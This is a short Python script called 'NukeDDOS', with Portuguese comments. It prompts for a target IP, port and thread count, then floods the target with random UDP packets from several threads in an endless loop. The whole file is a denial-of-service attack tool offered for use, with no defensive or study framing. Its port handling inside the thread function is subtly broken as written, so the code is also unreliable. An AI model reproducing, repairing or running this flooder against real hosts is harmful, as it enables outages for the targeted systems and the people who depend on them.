import sys
import os
import time
import socket
import random
import threading
from datetime import datetime
from colorama import Fore, Back, Style, init

# Inicializa o Colorama para texto colorido
init(autoreset=True)

# Obtém a data e hora atuais
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Cria o socket para o ataque
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Limpa a tela e exibe o título do ataque em roxo
os.system("clear")
os.system("figlet -f slant 'NukeDDOS'")
print(Fore.MAGENTA + Style.BRIGHT + "NukeDDOS")

# Exibe o autor e o link do GitHub
print(Fore.MAGENTA + "Author   : Laila19")
print(Fore.MAGENTA + "GitHub   : https://github.com/lailacypher")
print()

# Solicita o IP, porta e número de threads
ip = input("Target IP: ")
port = int(input("Port: "))
threads = int(input("Number of Threads: "))

# Função para realizar o ataque
def attack():
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))  # Envia o pacote para o IP e porta do alvo
        sent += 1
        port = port + 1  # Incrementa a porta para cada pacote enviado
        print(f"{Fore.MAGENTA}Sent {sent} packet(s) to {ip} through port: {port}")
        
        if port == 65534:
            port = 1  # Volta a porta para 1 após atingir o limite

# Limpa a tela novamente e exibe o título 'Attack Starting' em roxo
os.system("clear")
os.system("figlet -f slant 'Attack Starting'")
print(Fore.MAGENTA + "Starting the attack...")

# Atraso antes de iniciar os threads
time.sleep(2)

# Inicia os threads para realizar o ataque
for _ in range(threads):
    t = threading.Thread(target=attack)
    t.start()
